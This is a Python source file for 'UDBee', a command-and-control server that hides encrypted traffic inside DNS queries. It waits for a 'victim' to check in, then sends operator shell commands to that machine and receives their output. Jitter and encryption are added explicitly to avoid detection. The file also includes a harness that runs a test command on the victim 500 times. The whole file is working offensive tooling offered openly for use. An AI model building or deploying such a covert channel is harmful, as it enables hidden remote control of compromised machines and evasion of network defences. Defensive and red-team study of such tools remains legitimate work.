# Standard library imports for networking, threading, encryption, and CLI
import socket, random, time, sys, threading, argparse, base64, html, zlib, statistics, csv

# Custom modules for this DNS covert channel tool
from decryption import decrypt_message
from encryption import encrypt_message
from build_dns_message import dns_message
from prompt_toolkit import prompt  # For interactive command prompts
from prompt_toolkit.patch_stdout import patch_stdout
from check_missing import check_missing_packets
from generate_key_pairs import generate_key_pairs
from log import log_error, log_info, log_success, log_warn
from prompt_toolkit.shortcuts import print_formatted_text
from prompt_toolkit.formatted_text import HTML
from Crypto.PublicKey import ECC  # For ECDH key exchange
from dnslib import DNSRecord  # For DNS packet parsing

COMMAND_READY = threading.Event()

parser = argparse.ArgumentParser(description="UDBee - UDP Covert Channel Tool")
#parser.add_argument("-ip", required=True, type=str, help="Target IP address, IPv4 only")
parser.add_argument("--received-chunks", type=int, default=10, help="Received chunks size in KB unit, default is 10KB byte (make it low to avoid memory overflow)")
parser.add_argument("-delay", type=float, default=0, help="Delay between fragments, default is a float number between 0 and 3")
parser.add_argument("-buffer", type=float, default=10000, help="Fragments buffer, default is 10000 (to prevent memory overflow)")
parser.add_argument("-jitter", type=float, default=0, help="Random +/- jitter to apply on each fragment delay")
parser.add_argument('--generate-keys', action='store_true', required=False, default=False, help="Generates public and private ECDH keys, only use when you run the tool first time, or when you want to regenrate keys (You'll need to rebuild the executable )")
args = parser.parse_args()

my_ip = "0.0.0.0"
my_port = 53
SERVER = (my_ip, my_port)

# Target victim configuration
target_ip = None #args.ip
target_port = None  # Will be filled once victim checks in

# DNS packet fragmentation and transmission settings
chunk_size = 120  # How many bytes per DNS subdomain label
delay = args.delay  # Delay between sending chunks (to avoid detection)
received_chunk_size = args.received_chunks * 1024
buffer_size = args.buffer  # Max concurrent sessions in buffer
max_data_allowed = buffer_size * received_chunk_size
jitter = args.jitter  # Random variation in delay

# Encryption key for this session
my_priv_key = None
CURRENT_SESSION_KEY = None

# Tracking sent and received packets
transmitted_messages = 0
received_chunks = {}  # Store fragmented responses from victim
expected_chunks = None  # Total chunks we're waiting for
total_data_received = 0
last_received_time = None  # For timeout detection
resends_requests = 0  # Counter for retry attempts
sent_chunks = {}  # Cache of sent commands for potential resends

# UDP socket for covert communication
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def send_msg(message, is_cached: bool):
    """Send an encrypted command to the victim via DNS packets"""
    global transmitted_messages, CURRENT_SESSION_KEY
    try:
        message = str(message)
        
        # Encrypt the message before transmission
        if CURRENT_SESSION_KEY:
            encryption_result = encrypt_message(message, CURRENT_SESSION_KEY) 
            
            if encryption_result["success"] != True:
                log_error("Failed to encrypt command, session key might be invalid.")
                COMMAND_READY.set()
                return
            
            message = encryption_result["message"]
        else:
            log_error("Cannot send message, no active session key. Waiting for victim check-in.")
            COMMAND_READY.set()
            return

        # Convert message into DNS query packets
        chunks = dns_message(message, chunk_size)
        i = 0
        for chunk in chunks:
            # Cache chunks if this is a user command (for potential resend if victim requests it)
            if is_cached:
                sent_chunks[i] = chunk
                i+=1
            
            # Send the DNS packet to the victim
            sock.sendto(chunk, (target_ip, target_port))
            transmitted_messages+=1
            
            # Add jitter to packet timing to avoid detection patterns
            jitter_delay = delay + random.uniform(-jitter, jitter)
            jitter_delay = max(0, jitter_delay)
            time.sleep(jitter_delay)
    except Exception as e:
        log_error(str(e))
        COMMAND_READY.set()

def timeout_checker():
    """Monitor for incomplete responses and request retransmission of missing packets"""
    global received_chunks, expected_chunks, last_received_time, resends_requests
    while True:
        try:
            if last_received_time is not None:
                # Only retry 3 times before giving up
                if resends_requests < 3:
                    try:
                        current_session_id = None
                        current_buffer = None
                        if received_chunks:
                            current_session_id = next(iter(received_chunks))
                            current_buffer = received_chunks[current_session_id]["chunks"]
                            expected_chunks = received_chunks[current_session_id]["total"]

                        # Wait 3 seconds after last packet before checking for missing ones
                        if expected_chunks and current_buffer and (len(current_buffer) > 0) and ((time.time() - last_received_time) > 3):
                            missing_packets = check_missing_packets(current_buffer, expected_chunks)
                            if missing_packets:
                                log_info(f"<ansiyellow>Received an incomplete response from the vicim, asking victim for {len(missing_packets)} missing packets</ansiyellow>")
                                
                                # Request specific missing packets by index
                                indices_str = ",".join(str(i) for i in missing_packets)
                                msg = f"RESEND:{indices_str}"

                                send_msg(msg, False) 
                                resends_requests+=1
                                time.sleep(5)
                                continue
                    except Exception as e:
                        log_error(f"Timeout checker error: {str(e)}")
                else:
                    # Give up after 3 failed retry attempts
                    log_error("<ansired>Received an incomplete response from the vicim, tried 3 times to request the missing packets but didn't receive them, IGNORING THE RESPONSE!</ansired>")
                    resends_requests = 0
                    last_received_time = None
                    received_chunks = {}
                    expected_chunks = None
                    COMMAND_READY.set()
            time.sleep(0.5)
        except Exception as e:
            pass
        time.sleep(0.5)

def listener():
    """Listen for responses from the victim on our UDP server"""
    global transmitted_messages, target_ip, target_port, sent_chunks, received_chunks, expected_chunks, total_data_received, last_received_time, resends_requests, CURRENT_SESSION_KEY, my_priv_key
    
    # Bind the UDP socket to our listening port
    while True:
        try:
            sock.bind(SERVER)
            log_success(f"<ansigreen>Binded successfully on {SERVER}</ansigreen>")
            break
        except:
            continue
            
    # Continuously listen for incoming packets
    while True:
        try:
            data, addr = sock.recvfrom(4096)
            packet_length = len(data)
            total_data_received+=packet_length
            transmitted_messages+=1

            # Sanity checks to prevent memory exhaustion attacks
            if packet_length < 20: continue  # Too small to be valid DNS query
            if packet_length > received_chunk_size:
                log_info(f"<ansiyellow>Ignored a {packet_length/1024}KB long packet, there maybe a possible attack.</ansiyellow>")
                continue
            if total_data_received >= max_data_allowed:
                log_info(f"<ansiyellow>Data received is beyond max data allowed ({total_data_received/max_data_allowed}), there maybe a possible attack, stopping tool now.</ansiyellow>")
                return
            if len(received_chunks) >= buffer_size:
                log_info(f"<ansiyellow>The buffer is full ({buffer_size}), there maybe a possible attack, stopping tool now.</ansiyellow>")
                return

            # Parse the incoming DNS query packet
            dns_request = DNSRecord.parse(data)
            if dns_request.header.qr == 0:  # Ensure it's a query (not a response)
                # Extract the query domain name
                query_name = str(dns_request.q.qname).rstrip('.')
                parts = query_name.split('.')

                # Validate DNS subdomain structure
                if len(parts) < 5: continue
                session_id = dns_request.header.id
                index = int(parts[0])
                total = int(parts[1])
                if len(parts) == 5:
                    part = parts[2]
                else:
                    part = parts[2] + parts[3]
                
                # Extract victim's IP and port for sending responses
                ip, port = addr
                target_port = int(port)
                target_ip = ip

                # Update timestamp for timeout tracking
                last_received_time = time.time()
                
                # Create a new session buffer if this is the first chunk we're seeing
                if session_id not in received_chunks:
                    received_chunks[session_id] = {"total": total, "chunks": {}}
                buffer = received_chunks[session_id]
                
                # Skip if we already have this chunk (avoid duplicates)
                if index in buffer["chunks"]: continue
                buffer["chunks"][index] = part

                # Check if we've received all chunks for this message
                if len(buffer["chunks"]) == buffer["total"]:
                    # Reassemble chunks in correct order
                    full_msg = "".join(buffer["chunks"][i] for i in sorted(buffer["chunks"]))

                    # Add base32 padding if needed
                    missing_padding = len(full_msg) % 8
                    if missing_padding != 0:
                        full_msg += '=' * (8 - missing_padding)
                    
                    # Decode from base32
                    full_msg_bytes = base64.b32hexdecode(full_msg.encode('utf8'))

                    decryption_result = decrypt_message(full_msg_bytes, my_priv_key)

                    if decryption_result and decryption_result["success"] == True:
                        compressed_bytes = decryption_result["message"]  # مهم جداً: هذا BYTES فقط

                        try:
                            decompressed_data = zlib.decompress(compressed_bytes)
                            full_msg = decompressed_data.decode("utf-8", errors="replace")
                        except Exception as e:
                            try:
                                full_msg = compressed_bytes.decode("utf-8", errors="replace")
                            except:
                                full_msg = str(compressed_bytes)

                        # Update shared key for future encryption/decryption
                        CURRENT_SESSION_KEY = decryption_result["shared_key"]
                        
                        # Handle special messages from victim
                        if full_msg == "ACK":
                            # Command received successfully, clear cache
                            sent_chunks = {}
                            last_received_time = None
                        
                        elif full_msg.startswith("RESEND:"):
                            # Victim is asking for retransmission of specific chunks
                            try:
                                indices_str = full_msg.split(":", 1)[1]
                                missings = [int(i) for i in indices_str.split(',')]
                                log_info(f"<ansiyellow>Victim requested resend of {len(missings)} command chunks...</ansiyellow>")
                                for missing_index in missings:
                                    chunk = sent_chunks.get(missing_index)
                                    if chunk is not None:
                                        sock.sendto(chunk, (target_ip, target_port))
                            except Exception as e:
                                log_error(f"Error processing victim's RESEND request: {e}")
                        
                        elif full_msg == "heartbeat":
                            # Keep-alive ping from victim, just ignore it
                            pass
                            
                        else:
                            # Regular response output - display it to the operator
                            print_formatted_text(HTML(f"<ansigreen>{html.escape(full_msg)}</ansigreen>"))
                            
                        # Signal that we're ready for the next command
                        COMMAND_READY.set()
                            
                    else:
                        # Decryption failed
                        if decryption_result:
                            log_error(decryption_result["message"])
                        else:
                            log_error("Decryption failed for an unknown reason.")
                        
                        COMMAND_READY.set() 

                    # Clean up after successful message processing
                    received_chunks.pop(session_id)
                    expected_chunks = None
                    resends_requests = 0
                    continue
        except Exception as e:
            pass

def run_test(command_name, command_str, iterations, csv_writer):
    log_info(f"\n--- Starting Performance Test: '{command_name}' ({iterations} iterations) ---")
    timings_ms = []
    failures = 0
    
    for i in range(iterations):
        COMMAND_READY.clear()
        start_time = time.perf_counter()
        
        send_msg(command_str, True)
        
        success = COMMAND_READY.wait(timeout=120.0)
        
        end_time = time.perf_counter()
        
        if not success:
            log_error(f"Iteration {i+1} FAILED (Timeout after 120s)")
            csv_writer.writerow([command_name, i+1, "N/A", "TIMEOUT"])
            failures += 1
        else:
            duration_ms = (end_time - start_time) * 1000
            timings_ms.append(duration_ms)
            log_info(f"Iteration {i+1}/{iterations} complete: {duration_ms:.2f} ms")
            csv_writer.writerow([command_name, i+1, f"{duration_ms:.4f}", "SUCCESS"])
        
        time.sleep(0.5)

    if timings_ms:
        avg = statistics.mean(timings_ms)
        stdev = statistics.stdev(timings_ms) if len(timings_ms) > 1 else 0
        min_val = min(timings_ms)
        max_val = max(timings_ms)
        log_success(f"--- Test '{command_name}' Complete ---")
        log_success(f"Success/Fail: {len(timings_ms)}/{failures}")
        log_success(f"Avg: {avg:.2f} ms | StdDev: {stdev:.2f} ms")
        log_success(f"Min: {min_val:.2f} ms | Max: {max_val:.2f} ms")
    else:
        log_error(f"--- Test '{command_name}' FAILED (All {iterations} iterations timed out) ---")
    
    print("\n")
    return timings_ms

def main_test_harness():
    log_info("--- [!!] STARTING AUTOMATED PERFORMANCE TEST HARNESS [!!] ---")
    
    csv_filename = f"performance_results_fs_{time.strftime('%Y%m%d-%H%M%S')}.csv"
    log_info(f"Saving test results to: {csv_filename}")
    
    with open(csv_filename, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(["TestName", "Iteration", "Duration_ms", "Status"])
        run_test(
            command_name="Very Heavy (ls -lR /usr/bin 2>/dev/null | head -n 1000)",
            command_str="ls -lR /usr/bin 2>/dev/null | head -n 1000",
            iterations=500,
            csv_writer=writer
        )

    log_success("--- [!!] ALL PERFORMANCE TESTS COMPLETE [!!] ---")
    log_info(f"Results saved to {csv_filename}")
    log_info("Test harness finished. Returning to interactive shell.")



def main():
    """Main attacker interface - handles user commands and victim communication"""
    with patch_stdout():
        global my_priv_key, args, CURRENT_SESSION_KEY
        
        # Print banner
        logo = f"""
<ansiyellow>
    █   ██ ▓█████▄  ▄▄▄▄    ▓█████ ▓█████ 
    ██  ▓██▒▒██▀ ██▌▓█████▄ ▓█   ▀ ▓█   ▀ 
    ▓██  ▒██░░██   █▌▒██▒ ▄██▒███   ▒███   
    ▓▓█  ░██░░▓█▄   ▌▒██░█▀  ▒▓█  ▄ ▒▓█  ▄ 
    ▒▒█████▓ ░▒████▓ ░▓█  ▀█▓░▒████▒░▒████▒
    ░▒▓▒ ▒ ▒  ▒▒▓  ▒ ░▒▓███▀▒░░ ▒░ ░░░ ▒░ ░
    ░░▒░ ░ ░  ░ ▒  ▒ ▒░▒   ░  ░ ░  ░ ░ ░  ░
    ░░░ ░ ░  ░ ░  ░  ░    ░   ░      ░   
    ░          ░     ░         ░   ░   ░
          ░                ░
</ansiyellow>"""
        print_formatted_text(HTML(logo))
        print_formatted_text(HTML("\t🐝 <ansimagenta>UDBee</ansimagenta> <ansicyan>–</ansicyan> <ansigreen>Because TCP Is Too Mainstream</ansigreen>"))
        print_formatted_text(HTML("\t<ansimagenta>GitHub:</ansimagenta> <ansicyan>@MoMhaidat05</ansicyan>\n"))
        
        # Generate ECDH keys if requested
        if args.generate_keys:
            generate_key_pairs()
            return
            
        # Load our private key for ECDH key exchange
        try:
            with open('private_key.pem', 'r') as file:
                my_priv_key_pem = file.read()
                my_priv_key = ECC.import_key(my_priv_key_pem)
        except Exception as e:
            log_error(f"Exiting... Look like you have not initiated keys generation yet? error:\n{e}")
            return

        # Start background threads for listening and timeout detection
        threads = []
        thread = threading.Thread(target=listener)
        thread2 = threading.Thread(target=timeout_checker)
        threads.append(thread)
        threads.append(thread2)
        for t in threads:
            t.start()

        # Wait for victim to check in and establish encrypted session
        log_error("<ansired>Waiting for victim check-in to establish secure session...</ansired>")
        
        COMMAND_READY.wait()
        log_success("<ansigreen>Session established! You can now send commands.</ansigreen>") 
        COMMAND_READY.set()
        main_test_harness()
        # Main command loop
        while True:
            # Wait if we're still expecting a response
            if not COMMAND_READY.is_set():
                log_info("<ansiyellow>Waiting for response from victim...</ansiyellow>")
                COMMAND_READY.wait()
            
            # Get user command from prompt
            command = prompt(HTML('\n<ansicyan>UDBee</ansicyan> <ansimagenta>> </ansimagenta>')).strip()
            
            # Clear the ready flag - we're sending a new command
            COMMAND_READY.clear() 

            # Handle exit commands
            if command.lower() in ["exit", "quit"]:
                print_formatted_text(HTML("<ansigreen>Stopped buzzing :)</ansigreen>"))
                sys.exit(1)
            
            # Display help
            elif command.lower() == "help":
                print_formatted_text(HTML("<ansiyellow>Available commands:</ansiyellow>\n<ansigreen>help</ansigreen> : <ansiblue>shows this list</ansiblue>\n<ansigreen>exit - quit</ansigreen> : <ansiblue>exit the tool</ansiblue>\n<ansigreen>exec:</ansigreen> <ansiblue>if the command you wish to run on the victim machine conflicts with one of UDBee special commands, just put exec: before the command (e.g. exec:help)</ansiblue>"))
                COMMAND_READY.set()
                continue
            
            # Send actual commands to victim
            else:
                # 'exec:' prefix allows running victim commands that conflict with UDBee commands
                if command.startswith("exec:"):
                    command = command.replace("exec:","")
                if command == "":
                    log_error("<ansired>Command cannot be empty, please provide a valid command.</ansired>")
                    COMMAND_READY.set()
                    continue
                # Send the command and cache it for potential resends
                send_msg(command, True)
                
# Run the main interface
try:
    main()
except KeyboardInterrupt:
    log_info("<ansiyellow>Exiting on user interrupt (Ctrl+C)</ansiyellow>")
    exit()